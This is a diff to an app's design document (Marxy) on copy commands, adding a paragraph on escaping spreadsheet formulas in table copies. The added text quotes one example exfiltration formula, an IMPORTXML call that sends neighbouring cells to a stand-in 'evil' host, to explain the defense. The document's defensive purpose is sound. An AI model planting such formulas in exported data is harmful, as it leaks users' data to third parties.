@@ -193,6 +193,8 @@ operations not yet registered are skipped.
 | block | `op.copy-rich`, `op.copy-plain`, `op.copy-source`, `view.jump-to-source` | `op.copy-rich`, `op.copy-source` | `op.copy-source` |
 | inline | `op.copy-source`, `view.jump-to-source` | `op.copy-source` | `op.copy-source` |
 
+**Table copies carry no live formula.** Marxy opens untrusted documents, and a cell such as `=IMPORTXML("https://evil/?q="&A2,"//a")` pasted into Sheets would run and send the neighbouring cells to a third party, which the reader never asked for (private by default). The TSV text, its HTML and the CSV therefore prefix one `'` to a cell that starts with `=` or `@`, or with `+` or `-` unless the whole cell is a plain number (`-5`, `+1`, `-0.5`, `-1e3` stay as they are). Faithful-to-the-bytes is about the document; this is a derived payload whose purpose is a spreadsheet. The cost is a leading apostrophe on the rare `=`, `@` or `+text` cell, which Sheets and Excel treat as a text marker. JSON and "Copy as plain text" are not formula contexts and stay faithful.
+
 **Reading the tables.** The `selection.` prefix on the `text` kind is deliberate: those three commands act on a drag's DOM range, not on a node through an operation's `canApply`, so they are app commands rather than `op.*`. `op.copy-plain` and `op.copy-rich` are applicable to any `block`, `section` or `document` selection (a node with a source range, never a drag). `verbKindOf` yields `inline` only when a selection resolves to an inline node (a link or emphasis the reader selected with Alt+click); selection resolution mostly yields blocks, so `inline` is rare.
 
 **Rich copy of a drag.** `selection.copy-rich` writes sanitised HTML and plain text in one clipboard
